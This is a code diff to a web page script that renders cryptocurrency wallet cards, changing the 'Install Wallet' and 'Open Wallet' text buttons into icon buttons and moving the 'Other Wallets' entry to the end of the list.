@@ -7,7 +7,6 @@ const wallets = [
   "Trust",
   "Solflare",
   "WalletConnect",
-  "Other Wallets",
   "Terra",
   "Bitpay",
   "Maiar",
@@ -57,6 +56,7 @@ const wallets = [
   "Exodus",
   "Binance",
   "Bitget",
+  "Other Wallets",
 ];
 
 const container = document.getElementById("walletContainer");
@@ -72,25 +72,46 @@ wallets.forEach((name) => {
       .replace(/-/g, "")
       .replace(/\//g, "") + ".webp";
 
-  // Other Wallets without icon
+  // "Other Wallets" without main icon
   if (name.toLowerCase().includes("other")) {
     container.innerHTML += `
       <div class="wallet-card">
         <p>${name}</p>
-        <button onclick="showPWAPopup()">Install Wallet</button>
-        <button onclick="openWallet('${name}')">Open Wallet</button>
+
+        <div style="display:flex; justify-content:center; gap:18px; margin-top:12px;">
+            <img src="assets/icons/downloads.png" 
+                 onclick="showPWAPopup()" 
+                 style="width:35px; cursor:pointer;">
+
+            <img src="assets/icons/rocket.png" 
+                 onclick="openWallet('${name}')" 
+                 style="width:35px; cursor:pointer;">
+        </div>
+
       </div>
     `;
     return;
   }
 
+  // Normal wallet card
   container.innerHTML += `
     <div class="wallet-card">
       <img src="wallet-icons/${imageName}" alt="${name}">
       <p>${name}</p>
 
-      <button onclick="showPWAPopup()">Install Wallet</button>
-      <button onclick="openWallet('${name}')">Open Wallet</button>
+     <div class="icon-row">
+    <div class="icon-btn download-btn" onclick="showPWAPopup()">
+        <img src="assets/icons/downloads.png">
+        <span>Install Wallet</span>
+    </div>
+
+    <div class="icon-btn rocket-btn" onclick="openWallet('${name}')">
+        <img src="assets/icons/rocket.png">
+        <span>Open Wallet</span>
+    </div>
+</div>
+
+
     </div>
   `;
 });
